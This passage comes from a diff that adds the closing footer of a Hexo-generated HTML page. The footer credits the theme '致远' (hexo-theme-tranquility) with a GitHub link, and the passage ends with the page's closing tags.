+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
